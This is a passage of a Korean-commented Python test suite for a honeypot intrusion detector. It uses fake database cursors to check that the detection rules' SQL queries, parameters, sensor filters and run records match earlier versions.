#!/usr/bin/env python3
"""탐지기 발생원 범위 · 실행 기록 · --quiet 단위 시험. DB 없이 돈다.  python3 detector/test_detect_sensors.py

SQL 과 인자를 기록하는 가짜 커서로 신호 함수를 돌린다. BEFORE 는 변경 전 detect.py(760c779)가
v1 · v2 규칙마다 만든 SQL 과 인자를 그대로 옮긴 것이다. 병합 조건은 v1 · v2 결과가 바뀌지 않는
것이므로, 기준선 이탈(R005)에 발생원 한정이 붙는 것 말고는 한 글자도 달라지면 안 된다.

규칙군 확장(이슈 #14: w1 · a1 · i1)도 같은 조건이다. OLD_* 는 확장 전 detect.py(07da78f)의 적재 문장 ·
actor_rate 문장 · aggregate · 행 만들기를 그대로 옮긴 것이고, 대상(_target)이 없는 규칙은 이것과 같아야 한다.

적재 문장의 충돌 절만은 DO NOTHING 에서 DO UPDATE(ON_CONFLICT_GROW)로 바꿨다. 이어지는 사건이 처음 값으로
굳지 않게 하려는 것이라, 충돌 절 앞까지(열 · VALUES)와 적재 행은 옛 것과 같아야 한다.
OPSLOOP_TEST_DATABASE_URL 이 있으면 연결 전용 임시 테이블에서 갱신 · 판정 보존 · 알림 트리거를 실제로 본다.

v3(2회차)는 같은 페이로드 흡수 · R006 키 심기(key_plant) · R005 이전 7일 기준선을 더했다. 옵션이 없는 규칙은
문장 · 적재 행 · 요약 표가 전과 같아야 한다. OPSLOOP_LAB_DATABASE_URL(실험 DB, 운영 덤프)이 있으면 실제 표에서
v1 · v2 를 다시 돌려 저장된 행(키 · 끝 시각 · 건수 · 근거)과 같은지, v3 를 시간씩 늘려 돌린 결과 · 하루 구간씩 돌린
결과 · 첫 사건을 판정해 가며 돌린 결과가 한 번에 돌린 결과와 같은지 본다. 그 시험은 커밋하지 않고 끝에 되돌린다.
v3 시험은 incident_absorbed 표(infra/migrations/20260925_v3_absorbed.sql)가 있어야 돈다.
v3 R005 는 σ 4.5(관측 분포 p99)에서 실험 DB 에 5칸이 있어 증분 · 구간 실행 시험은 규칙 파일 그대로 돈다.
알림 트리거(infra/notify.sql)는 커밋 때 행이 남은 인시던트만 알린다. 같은 트랜잭션에서 넣고 지운 인시던트는 알리지 않는다.

w2(rules_w1.json)는 R102 에 exclude_url_patterns 를 더했다. 문장 자리 · 인자 순서 · 형식 오류는 가짜 커서로,
패턴의 뜻은 파이썬 re 로 본다(쓰는 문법은 PostgreSQL 정규식과 같다). 두 DB 연결 중 하나가 있으면 PostgreSQL 에서도
같은 목록을 돌리고, 실험 DB 에서는 w1 · w2 를 함께 돌려 오탐 사건 하나만 사라지는지 본다.

c1(rules_cve.json, 이슈 #39)은 새 유형 url_signature(요청 경로 서명)다. 문장 · 인자 순서 · 형식 오류 · 신호 모양 ·
근거의 서명 · 발생원 합집합은 가짜 커서로, 서명의 뜻은 저장소 파일을 읽어 합성 URL 표본을 파이썬 re 로 본다.
OPSLOOP_TEST_DATABASE_URL 이 있으면 임시 표에 같은 표본을 넣고 PostgreSQL 이 같은 답을 내는지, 요청 하나가 서명
여럿에 맞아도 신호 · 근거가 하나인지 본다. 서명 키가 없는 옛 규칙의 근거는 한 글자도 바뀌지 않아야 한다.
KEV 조건(kev_match) · 자산 조건(asset_match)의 형식과, 서명 정규식이 두 엔진에서 같게 읽히는지(regex_gap)도 본다.
DB 가 있으면 받는 정규식은 PostgreSQL 과 파이썬이 같은 답을, 거절하는 것은(정책으로 막는 것 밖) 실제로 다른 답을 내는지,
늦게 들어온 더 이른 요청이 새 키 사건을 만들고 먼저 뜬 사건이 남는 구조적 한계(rules_cve.json note)를 본다.
"""
import contextlib
import copy
import hashlib
import io
import json
import os
import re
import statistics
import sys
import threading
import time
import types
import unittest
import warnings
from datetime import datetime, timedelta, timezone
from unittest import mock

# psycopg2 가 없는 곳에서도 돌게 가짜를 넣는다 (DB 에는 붙지 않는다). 있으면 적재 문장 DB 시험에 진짜를 쓴다
try:
    import psycopg2
    import psycopg2.extras
    REAL_PG = True
except ImportError:
    fake = types.ModuleType("psycopg2")
    extras = types.ModuleType("psycopg2.extras")
    extras.execute_batch = lambda *a, **k: None
    fake.extras = extras
    sys.modules["psycopg2"], sys.modules["psycopg2.extras"] = fake, extras
    REAL_PG = False

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import detect  # noqa: E402

SINCE, UNTIL = "2026-09-05", "2026-09-06"
SENSOR = " AND sensor = ANY(%s)"
HONEYPOT = ["cowrie", "decoy", "console"]
EXCLUDED = [("1.2.3.4",)]      # v2 R005 가 앞 규칙 인시던트에서 읽는 행위자

# (버전, 규칙, 범위 지정 여부) → [(SQL, 인자)]. 변경 전 코드의 출력 그대로.
BEFORE = {
    ("v1", "R001", False): [
        ("SELECT ts, src_ip, session FROM events WHERE provenance = 'real' AND eventid = ANY(%s) "
         "AND src_ip IS NOT NULL ORDER BY src_ip, ts",
         [["cowrie.login.failed", "cowrie.login.success"]])],
    ("v1", "R001", True): [
        ("SELECT ts, src_ip, session FROM events WHERE provenance = 'real' AND ts >= %s AND ts < %s "
         "AND eventid = ANY(%s) AND src_ip IS NOT NULL ORDER BY src_ip, ts",
         [SINCE, UNTIL, ["cowrie.login.failed", "cowrie.login.success"]])],
    ("v1", "R002", False): [
        ("SELECT first_ts, src_ip, session, login_attempts, command_count FROM sessions "
         "WHERE provenance = 'real' AND (login_success AND command_count > 0)",
         [])],
    ("v1", "R002", True): [
        ("SELECT first_ts, src_ip, session, login_attempts, command_count FROM sessions "
         "WHERE provenance = 'real' AND first_ts >= %s AND first_ts < %s AND (login_success "
         "AND command_count > 0)",
         [SINCE, UNTIL])],
    ("v1", "R003", False): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND eventid LIKE %s",
         ["cowrie.session.file_%"])],
    ("v1", "R003", True): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND ts >= %s AND ts < %s AND eventid LIKE %s",
         [SINCE, UNTIL, "cowrie.session.file_%"])],
    ("v1", "R004", False): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND eventid = %s",
         ["cowrie.direct-tcpip.request"])],
    ("v1", "R004", True): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND ts >= %s AND ts < %s AND eventid = %s",
         [SINCE, UNTIL, "cowrie.direct-tcpip.request"])],
    ("v1", "R005", False): [
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "GROUP BY 1 ORDER BY 1",
         [])],
    ("v1", "R005", True): [
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND ts >= %s AND ts < %s GROUP BY 1 ORDER BY 1",
         [SINCE, UNTIL])],
    ("v2", "R001", False): [
        ("SELECT ts, src_ip, session FROM events WHERE provenance = 'real' AND eventid = ANY(%s) "
         "AND src_ip IS NOT NULL ORDER BY src_ip, ts",
         [["cowrie.login.failed", "cowrie.login.success"]])],
    ("v2", "R001", True): [
        ("SELECT ts, src_ip, session FROM events WHERE provenance = 'real' AND ts >= %s AND ts < %s "
         "AND eventid = ANY(%s) AND src_ip IS NOT NULL ORDER BY src_ip, ts",
         [SINCE, UNTIL, ["cowrie.login.failed", "cowrie.login.success"]])],
    ("v2", "R002", False): [
        ("SELECT first_ts, src_ip, session, login_attempts, command_count FROM sessions "
         "WHERE provenance = 'real' AND (login_success AND command_count > 0) AND EXISTS "
         "(SELECT 1 FROM events e WHERE e.session = sessions.session AND e.eventid = "
         "'cowrie.command.input' AND e.input IS NOT NULL AND e.input !~* ALL(%s))",
         [["^\\s*echo(\\s|$)", "^\\s*true\\s*$", "^\\s*:\\s*$", "^\\s*exit\\s*$", "^\\s*$"]])],
    ("v2", "R002", True): [
        ("SELECT first_ts, src_ip, session, login_attempts, command_count FROM sessions "
         "WHERE provenance = 'real' AND first_ts >= %s AND first_ts < %s AND (login_success "
         "AND command_count > 0) AND EXISTS (SELECT 1 FROM events e WHERE e.session = "
         "sessions.session AND e.eventid = 'cowrie.command.input' AND e.input IS NOT NULL "
         "AND e.input !~* ALL(%s))",
         [SINCE, UNTIL,
          ["^\\s*echo(\\s|$)", "^\\s*true\\s*$", "^\\s*:\\s*$", "^\\s*exit\\s*$", "^\\s*$"]])],
    ("v2", "R003", False): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND eventid LIKE %s AND (shasum IS NULL OR "
         "shasum NOT LIKE %s)",
         ["cowrie.session.file_%", "e3b0c44298fc1c14%"])],
    ("v2", "R003", True): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND ts >= %s AND ts < %s AND eventid LIKE %s AND "
         "(shasum IS NULL OR shasum NOT LIKE %s)",
         [SINCE, UNTIL, "cowrie.session.file_%", "e3b0c44298fc1c14%"])],
    ("v2", "R004", False): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND eventid = %s",
         ["cowrie.direct-tcpip.request"])],
    ("v2", "R004", True): [
        ("SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) FROM "
         "events WHERE provenance = 'real' AND ts >= %s AND ts < %s AND eventid = %s",
         [SINCE, UNTIL, "cowrie.direct-tcpip.request"])],
    ("v2", "R005", False): [
        ("SELECT DISTINCT host(actor_ip) FROM incidents WHERE rule_version = %s AND rule_id "
         "<> %s AND actor_ip IS NOT NULL",
         ["v2", "R005"]),
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND (src_ip IS NULL OR host(src_ip) <> ALL(%s)) GROUP BY 1 ORDER BY 1",
         [["1.2.3.4"]])],
    ("v2", "R005", True): [
        ("SELECT DISTINCT host(actor_ip) FROM incidents WHERE rule_version = %s AND rule_id "
         "<> %s AND actor_ip IS NOT NULL",
         ["v2", "R005"]),
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND ts >= %s AND ts < %s AND (src_ip IS NULL OR host(src_ip) <> ALL(%s)) GROUP BY "
         "1 ORDER BY 1",
         [SINCE, UNTIL, ["1.2.3.4"]])],
}

# 바뀐 뒤의 R005. 기간 조건 바로 뒤에 발생원 한정 하나가 붙는다.
BASELINE_AFTER = {
    ("v1", "R005", False): [
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND sensor = ANY(%s) GROUP BY 1 ORDER BY 1",
         [HONEYPOT])],
    ("v1", "R005", True): [
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND ts >= %s AND ts < %s AND sensor = ANY(%s) GROUP BY 1 ORDER BY 1",
         [SINCE, UNTIL, HONEYPOT])],
    ("v2", "R005", False): [
        BEFORE[("v2", "R005", False)][0],
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND sensor = ANY(%s) AND (src_ip IS NULL OR host(src_ip) <> ALL(%s)) GROUP BY 1 ORDER BY 1",
         [HONEYPOT, ["1.2.3.4"]])],
    ("v2", "R005", True): [
        BEFORE[("v2", "R005", True)][0],
        ("SELECT date_trunc('hour', ts) h, count(*) FROM events WHERE provenance = 'real' "
         "AND ts >= %s AND ts < %s AND sensor = ANY(%s) AND (src_ip IS NULL OR host(src_ip) <> ALL(%s)) "
         "GROUP BY 1 ORDER BY 1",
         [SINCE, UNTIL, HONEYPOT, ["1.2.3.4"]])],
}


class FakeCursor:
    """실행한 SQL 과 인자를 그대로 기록한다. 응답은 answer(sql) 가 정한다."""

    def __init__(self, answer=None):
        self.log, self.batches, self.rows = [], [], []
        self.answer = answer or (lambda sql: [])

    def execute(self, sql, params=None):
        self.log.append((sql, None if params is None else copy.deepcopy(list(params))))
        self.rows = self.answer(sql)

    def fetchall(self):
        return list(self.rows)

    def fetchone(self):
        return self.rows[0] if self.rows else None

    def close(self):
        pass


class FakeConn:
    def __init__(self, cur):
        self.cur, self.commits = cur, 0

    def cursor(self):
        return self.cur

    def commit(self):
        self.cur.log.append(("COMMIT", None))
        self.commits += 1

    def close(self):
        pass


def fake_execute_batch(cur, sql, rows, page_size=100):
    cur.batches.append((sql, list(rows)))


# 진짜 psycopg2 가 있는 곳에서도 가짜 커서에 쓰도록 바꿔 둔다 (진짜는 cur.mogrify 를 부른다)
detect.execute_batch = fake_execute_batch


def db_answer(regclass=True):
    """run() 이 부르는 질의에 대한 응답. 신호는 없다."""
    def answer(sql):
        if "to_regclass" in sql:
            return [(regclass,)]
        if "SELECT count(*) FROM incidents" in sql:
            return [(0,)]
        if "DISTINCT host(actor_ip)" in sql:
            return EXCLUDED
        return []
    return answer


def load(name):
    with open(os.path.join(HERE, name), encoding="utf-8") as f:
        return json.load(f)


def collect(doc, rule, since=None, until=None):
    """run() 과 같은 준비를 하고 신호 함수 하나를 돌려 기록을 돌려준다."""
    rule = copy.deepcopy(rule)
    detect.prepare_rule(doc, rule)
    cur = FakeCursor(db_answer())
    detect.COLLECTORS[rule["type"]](cur, rule, since, until)
    return [(sql, prm) for sql, prm in cur.log]


def with_sensors(rule, sensors):
    rule = copy.deepcopy(rule)
    rule["params"]["sensors"] = sensors
    return rule


def run_quiet(doc, answer=None, since=None, until=None):
    cur = FakeCursor(answer or db_answer())
    conn = FakeConn(cur)
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        detect.run(conn, copy.deepcopy(doc), since, until, verbose=False)
    return cur, conn, out.getvalue()


class BeforeAfterTest(unittest.TestCase):
    """v1 · v2 규칙이 만드는 SQL 과 인자를 변경 전과 대조한다."""

    def each(self):
        for name in ("rules.json", "rules_v2.json"):
            doc = load(name)
            for rule in doc["rules"]:
                for ranged in (False, True):
                    rng = (SINCE, UNTIL) if ranged else (None, None)
                    yield (doc["rule_version"], rule["id"], ranged), collect(doc, rule, *rng)

    def test_기준값이_규칙_전부를_덮는다(self):
        self.assertEqual({k for k, _ in self.each()}, set(BEFORE))

    def test_R001_R004_는_한_글자도_같다(self):
        # R001(actor_rate)은 2026-09-21 검토에서 집계를 DB 로 옮겼다 (전체 행을 메모리에 올리지 않게).
        # 문장은 달라졌고, 결과가 같은지는 운영 DB 사본의 v1 · v2 인시던트 키 지문으로 확인했다
        for key, got in self.each():
            if key[1] not in ("R005", "R001"):
                with self.subTest(key=key):
                    self.assertEqual(got, BEFORE[key])

    def test_R001_은_DB_에서_창별로_센다(self):
        for key, got in self.each():
            if key[1] == "R001":
                with self.subTest(key=key):
                    [(sql, prm)] = got
                    [(old_sql, old_prm)] = BEFORE[key]
                    self.assertIn("GROUP BY src_ip, floor(extract(epoch FROM ts) / %s)", sql)
                    self.assertIn("HAVING count(*) >= %s", sql)
                    self.assertEqual(prm[:len(old_prm)], old_prm)          # 기간 · eventid 인자는 그대로
                    self.assertEqual(prm[len(old_prm):], [900, 5])

    def test_R005_는_발생원_한정만_붙는다(self):
        for key, got in self.each():
            if key[1] == "R005":
                with self.subTest(key=key):
                    self.assertEqual(got, BASELINE_AFTER[key])
                    # 한정을 걷어 내면 변경 전과 같다
                    stripped = [(sql.replace(SENSOR, ""), [x for x in prm if x != HONEYPOT])
                                for sql, prm in got]
                    self.assertEqual(stripped, BEFORE[key])

    def test_run_전체도_기준선_말고는_같은_문장(self):
        # run() 이 내는 문장 중 신호 질의는 위 기준값과 같은 순서로 나온다
        for name in ("rules.json", "rules_v2.json"):
            doc = load(name)
            cur, conn, _ = run_quiet(doc, since=SINCE, until=UNTIL)
            got = [(sql, prm) for sql, prm in cur.log
                   if sql.startswith("SELECT") and "FROM incidents WHERE rule_id" not in sql
                   and "to_regclass" not in sql]
            want = []
            for rule in doc["rules"]:
                key = (doc["rule_version"], rule["id"], True)
                if rule["type"] == "actor_rate":
                    want += collect(doc, rule, SINCE, UNTIL)             # 위 시험에서 따로 본다
                else:
                    want += BASELINE_AFTER.get(key, BEFORE[key])
            with self.subTest(rules=name):
                self.assertEqual(got, want)
                self.assertEqual(conn.commits, 1)


class SensorsTest(unittest.TestCase):
    """params.sensors 가 있으면 모든 신호 함수가 그 발생원만 본다."""

    RULES = [
        {"id": "T1", "type": "session_threshold",
         "params": {"field": "login_attempts", "op": ">=", "value": 3}},
        {"id": "T2", "type": "session_compound",
         "params": {"expr": "login_success", "noop_command_patterns": ["^\\s*$"]}},
        {"id": "T3", "type": "event_match", "params": {"eventid": "sshd.login.success"}},
        {"id": "T4", "type": "event_match",
         "params": {"eventid_like": "%.agent.rejected", "exclude_shasum_prefixes": ["00"]}},
        {"id": "T5", "type": "actor_rate",
         "params": {"eventids": ["sshd.login.failed"], "window_seconds": 600, "threshold": 5}},
        {"id": "T10", "type": "url_signature",
         "params": {"eventids": ["nginx.request", "decoy.request"],
                    "signatures": [{"id": "a", "pattern": "^/a$", "methods": ["PUT"], "cves": [], "mapping": "analyst"},
                                   {"id": "b", "pattern": "^/b(/.*)?$", "cves": ["CVE-2021-41773"],
                                    "mapping": "explicit"}]}},
        # 기준선 이탈은 마지막에 둔다 (아래 시험이 RULES[-1] 로 따로 본다)
        {"id": "T6", "type": "baseline_deviation",
         "params": {"sigma": 3.0, "exclude_alerted_actors": True}},
    ]
    DOC = {"rule_version": "t1"}
    NODES = ["web-01", "collector"]

    def test_모든_유형이_거르고_인자_순서가_맞다(self):
        for rule in self.RULES:
            for rng in ((None, None), (SINCE, UNTIL), (SINCE, None)):
                with self.subTest(rule=rule["id"], rng=rng):
                    got = collect(self.DOC, with_sensors(rule, self.NODES), *rng)
                    main = [(sql, prm) for sql, prm in got if SENSOR in sql]
                    self.assertEqual(len(main), 1)
                    sql, prm = main[0]
                    # 발생원 자리표시자 앞의 %s 개수가 인자 목록에서 발생원 목록의 위치와 같다
                    self.assertEqual(sql[:sql.index("sensor = ANY(%s)")].count("%s"), prm.index(self.NODES))
                    self.assertEqual(sql.count("%s"), len(prm))
                    self.assertNotIn(HONEYPOT, prm)

    def test_거르는_것_말고는_그대로(self):
        for rule in self.RULES:
            if rule["type"] == "baseline_deviation":
                continue
            with self.subTest(rule=rule["id"]):
                plain = collect(self.DOC, rule, SINCE, UNTIL)
                got = collect(self.DOC, with_sensors(rule, self.NODES), SINCE, UNTIL)
                stripped = [(sql.replace(SENSOR, ""), [x for x in prm if x != self.NODES])
                            for sql, prm in got]
                self.assertEqual(stripped, plain)
                self.assertFalse(any(SENSOR in sql for sql, _ in plain))

    def test_기준선_이탈은_지정하면_그_값을_쓴다(self):
        rule = self.RULES[-1]
        plain = collect(self.DOC, rule, SINCE, UNTIL)
        got = collect(self.DOC, with_sensors(rule, self.NODES), SINCE, UNTIL)
        self.assertEqual(plain[-1][1], [SINCE, UNTIL, HONEYPOT, ["1.2.3.4"]])
        self.assertEqual(got[-1][1], [SINCE, UNTIL, self.NODES, ["1.2.3.4"]])
        self.assertEqual(got[-1][0], plain[-1][0])

    def test_형식이_틀리면_규칙_오류(self):
        for bad in ("collector", [], [""], [1], {"a": 1}):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    collect(self.DOC, with_sensors(self.RULES[2], bad))


class RuleFileTest(unittest.TestCase):
    """rules_self.json(s1) · rules_node.json(n1) · rules_w1.json(w2) · rules_audit.json(a1) · rules_infra.json(i2) ·
    rules_cve.json(c1)."""

    def test_형식은_rules_json_과_같다(self):
        base = load("rules.json")
        for name, ver in (("rules_self.json", "s1"), ("rules_node.json", "n1"), ("rules_w1.json", "w2"),
                          ("rules_audit.json", "a1"), ("rules_infra.json", "i2"), ("rules_cve.json", "c1")):
            with self.subTest(rules=name):
                doc = load(name)
                self.assertEqual(doc["rule_version"], ver)
                self.assertTrue(doc["note"])
                self.assertEqual(set(doc["aggregation"]), set(base["aggregation"]))
                self.assertEqual(doc["aggregation"]["window_gap_seconds"], 900)
                for rule in doc["rules"]:
                    self.assertIn(rule["type"], detect.COLLECTORS)
                    self.assertIn(rule["severity"], detect.SEVERITY_RANK)
                    self.assertTrue(rule["enabled"])
                    self.assertTrue(rule["rationale"])

    def test_R202_는_관문과_풀러의_거부만(self):
        doc = load("rules_self.json")
        [rule] = doc["rules"]
        self.assertEqual((rule["id"], rule["name"], rule["severity"], rule["type"]),
                         ("R202", "미등록 에이전트 접속", "high", "event_match"))
        self.assertNotIn("aggregation_gap_seconds", rule)
        [(sql, prm)] = collect(doc, rule)
        self.assertEqual(sql, "SELECT ts, src_ip, session, eventid, coalesce(shasum, url, input, message) "
                              "FROM events WHERE provenance = 'real' AND sensor = ANY(%s) AND eventid LIKE %s")
        self.assertEqual(prm, [["collector", "puller"], "%.agent.rejected"])

    def test_R101_은_sshd_실패만(self):
        doc = load("rules_node.json")
        [rule] = doc["rules"]
        self.assertEqual((rule["id"], rule["name"], rule["severity"], rule["type"]),
                         ("R101", "SSH 반복 실패 (관제 대상)", "medium", "actor_rate"))
        self.assertEqual(rule["params"], {"eventids": ["sshd.login.failed", "sshd.login.invalid_user"],
                                          "window_seconds": 600, "threshold": 5})
        [(sql, prm)] = collect(doc, rule, SINCE, UNTIL)
        self.assertNotIn(SENSOR, sql)
        self.assertEqual(prm, [SINCE, UNTIL, ["sshd.login.failed", "sshd.login.invalid_user"], 600, 5])

    def test_rule_versions_에_파일_그대로_등록(self):
        for name in ("rules_self.json", "rules_node.json", "rules.json", "rules_v2.json",
                     "rules_w1.json", "rules_audit.json", "rules_infra.json", "rules_cve.json"):
            with self.subTest(rules=name):
                doc = load(name)
                cur, _, _ = run_quiet(doc)
                sql, prm = cur.log[0]
                self.assertIn("INSERT INTO rule_versions", sql)
                self.assertIn("ON CONFLICT (rule_version) DO NOTHING", sql)
                self.assertEqual(prm[0], doc["rule_version"])
                self.assertEqual(json.loads(prm[1]), doc)          # _version 이 섞이기 전의 정의
                self.assertEqual(prm[2], doc["note"])


class RunRecordTest(unittest.TestCase):
    """run() 끝의 detector_runs 한 행."""

    def test_커밋_앞에_한_행(self):
        cur, conn, _ = run_quiet(load("rules_self.json"), since=SINCE, until=UNTIL)
        ins = [i for i, (sql, _) in enumerate(cur.log) if "INSERT INTO detector_runs" in sql]
        self.assertEqual(len(ins), 1)
        sql, prm = cur.log[ins[0]]
        self.assertEqual(prm, ["s1", SINCE, UNTIL, "s1"])
        self.assertIn("now(), clock_timestamp(), count(*)", sql)
        self.assertIn("created_at = now()", sql)
        self.assertIn("to_regclass('detector_runs')", cur.log[ins[0] - 1][0])
        self.assertEqual(cur.log[ins[0] + 1], ("COMMIT", None))
        self.assertEqual(conn.commits, 1)

    def test_범위가_없으면_NULL(self):
        cur, _, _ = run_quiet(load("rules_node.json"))
        [prm] = [p for sql, p in cur.log if "INSERT INTO detector_runs" in sql]
        self.assertEqual(prm, ["n1", None, None, "n1"])

    def test_표가_없는_구_스키마는_건너뜀(self):
        cur, conn, _ = run_quiet(load("rules.json"), answer=db_answer(regclass=False))
        self.assertFalse(any("detector_runs" in sql and "INSERT" in sql for sql, _ in cur.log))
        self.assertEqual(cur.log[-1], ("COMMIT", None))
        self.assertEqual(conn.commits, 1)


class QuietTest(unittest.TestCase):
    """--quiet 는 요약 표를 찍지 않는다."""

    def main(self, *extra):
        cur = FakeCursor(db_answer())
        argv = ["detect.py", "--db-url", "postgresql://시험", "--run",
                "--rules", os.path.join(HERE, "rules_self.json"), *extra]
        out = io.StringIO()
        with mock.patch.object(sys, "argv", argv), \
             mock.patch.object(detect.psycopg2, "connect", create=True, return_value=FakeConn(cur)), \
             contextlib.redirect_stdout(out):
            detect.main()
        return cur, out.getvalue()

    def test_quiet_면_아무것도_안_찍는다(self):
        cur, out = self.main("--quiet")
        self.assertEqual(out, "")
        self.assertTrue(any("INSERT INTO detector_runs" in sql for sql, _ in cur.log))

    def test_없으면_요약_표(self):
        _, out = self.main()
        self.assertIn("탐지 실행  규칙버전 s1", out)
        self.assertIn("R202", out)


# ----------------------------------------------------------------------
#  규칙군 확장 (이슈 #14): w1 · a1 · i1
# ----------------------------------------------------------------------

UTC = timezone.utc
T0 = datetime(2026, 9, 5, 0, 0, tzinfo=UTC)

# 확장 전 적재 문장 (07da78f run() 의 execute_batch 첫 인자, 글자 그대로)
OLD_INSERT = """
            INSERT INTO incidents (incident_key, rule_id, rule_version, rule_name, severity,
                                   actor_ip, first_ts, last_ts, signal_count, session_count,
                                   evidence)
            VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s::jsonb)
            ON CONFLICT (incident_key) DO NOTHING"""
# 옛 충돌 절. 이것만 ON_CONFLICT_GROW 로 바뀌고 그 앞(열 · VALUES)은 글자 그대로다
OLD_CONFLICT = "\n            ON CONFLICT (incident_key) DO NOTHING"
OLD_HEAD = OLD_INSERT[:-len(OLD_CONFLICT)]
NEW_INSERT = OLD_HEAD + detect.ON_CONFLICT_GROW

# 확장 전 actor_rate 문장 (07da78f, 범위 지정 여부별)
OLD_ACTOR_RATE = {
    False: "SELECT min(ts), src_ip, (array_agg(session ORDER BY ts))[1], count(*) FROM events "
           "WHERE provenance = 'real' AND eventid = ANY(%s) AND src_ip IS NOT NULL "
           "GROUP BY src_ip, floor(extract(epoch FROM ts) / %s) "
           "HAVING count(*) >= %s ORDER BY src_ip, min(ts)",
    True: "SELECT min(ts), src_ip, (array_agg(session ORDER BY ts))[1], count(*) FROM events "
          "WHERE provenance = 'real' AND ts >= %s AND ts < %s AND eventid = ANY(%s) AND src_ip IS NOT NULL "
          "GROUP BY src_ip, floor(extract(epoch FROM ts) / %s) "
          "HAVING count(*) >= %s ORDER BY src_ip, min(ts)",
}


def old_aggregate(signals, gap_seconds):
    """확장 전 aggregate (07da78f 그대로). IP 로만 묶는다."""
    by_ip = {}
    for ts, ip, sess, detail in signals:
        by_ip.setdefault(ip, []).append((ts, sess, detail))

    groups = []
    for ip, items in by_ip.items():
        items.sort(key=lambda x: x[0])
        cur_group = [items[0]]
        for prev, nxt in zip(items, items[1:]):
            if (nxt[0] - prev[0]).total_seconds() <= gap_seconds:
                cur_group.append(nxt)
            else:
                groups.append((ip, cur_group))
                cur_group = [nxt]
        groups.append((ip, cur_group))
    return groups


def old_rows(rule, version, signals, gap):
    """확장 전 run() 이 규칙 하나에서 만든 적재 행 (07da78f 그대로)."""
    rows = []
    for ip, items in old_aggregate(signals, gap):
        first_ts, last_ts = items[0][0], items[-1][0]
        sessions = sorted({i[1] for i in items if i[1]})
        key = f"{rule['id']}|{version}|{ip or '-'}|{first_ts.isoformat()}"
        metrics = [i[2] for i in items if isinstance(i[2], dict)]
        counts = [m["count"] for m in metrics if "count" in m]
        devs = [(m["count"] - m["mean"]) / m["sigma"]
                for m in metrics if m.get("sigma")]
        observed = {}
        if counts:
            observed["observed_count_max"] = max(counts)
        if devs:
            observed["observed_sigma_max"] = round(max(devs), 2)

        evidence = json.dumps(
            {"sample": [i[2] for i in items[:5]], "sessions": sessions[:10],
             **observed},
            ensure_ascii=False, default=str)
        rows.append((key, rule["id"], version, rule["name"], rule["severity"], ip,
                     first_ts, last_ts, len(items), len(sessions), evidence))
    return rows


def at(minutes):
    return T0 + timedelta(minutes=minutes)


# 옛 규칙이 받는 신호 행. 같은 IP 가 흩어져 오고, 통합 창 안팎의 간격과 IP 없는 행이 섞여 있다
ACTOR_ROWS = [(at(0), "1.1.1.1", "s1", 5), (at(15), "1.1.1.1", None, 7), (at(5), "2.2.2.2", "s4", 9),
              (at(90), "1.1.1.1", "s3", 5), (at(2), "1.1.1.1", "s5", 6), (at(95), "2.2.2.2", "s6", 5)]
SESSION_ROWS = [(at(0), "3.3.3.3", "a", 1, 2), (at(60), "3.3.3.3", "b", 1, 1), (at(3), None, "c", 0, 1),
                (at(4), "1.1.1.1", "d", 1, 3)]
EVENT_ROWS = [(at(0), "4.4.4.4", "x", "cowrie.session.file_download", "abc"),
              (at(10), "4.4.4.4", "y", "cowrie.session.file_upload", "def"), (at(30), None, None, "e", "f")]
HOUR_ROWS = [(T0 + timedelta(hours=h), 500 if h == 20 else 10 + h % 3) for h in range(30)]


def signal_answer(sql):
    """옛 규칙군(v1 · v2 · n1)이 부르는 질의마다 신호가 있는 응답."""
    if "to_regclass" in sql:
        return [(True,)]
    if "SELECT count(*) FROM incidents" in sql:
        return [(0,)]
    if "DISTINCT host(actor_ip)" in sql:
        return EXCLUDED
    if "GROUP BY src_ip" in sql:
        return ACTOR_ROWS
    if "FROM sessions" in sql:
        return SESSION_ROWS
    if "coalesce(shasum" in sql:
        return EVENT_ROWS
    if "date_trunc('hour'" in sql:
        return HOUR_ROWS
    return []


def signals_of(doc, rule, answer, since=None, until=None):
    """run() 과 같은 준비로 신호 함수 하나가 돌려주는 신호."""
    rule = copy.deepcopy(rule)
    detect.prepare_rule(doc, rule)
    return detect.COLLECTORS[rule["type"]](FakeCursor(answer), rule, since, until)


def rule_of(name, rid):
    doc = load(name)
    return doc, next(r for r in doc["rules"] if r["id"] == rid)


def grow_sets():
    """ON_CONFLICT_GROW 의 SET 절을 [(열, 식)] 으로. 한 줄에 대입 하나다."""
    lines = [" ".join(ln.split()) for ln in detect.ON_CONFLICT_GROW.strip().splitlines()]
    body = lines[1:next(i for i, ln in enumerate(lines) if ln.startswith("WHERE "))]
    return [tuple(ln.removeprefix("SET ").rstrip(",").split(" = ", 1)) for ln in body]


def keep_judged_sql(rel="infra/schema.sql"):
    """판정된 사건을 지키는 트리거(함수 + 트리거) 문장을 스키마 파일에서 그대로 떼어 낸다."""
    with open(os.path.join(os.path.dirname(HERE), rel), encoding="utf-8") as f:
        text = f.read()
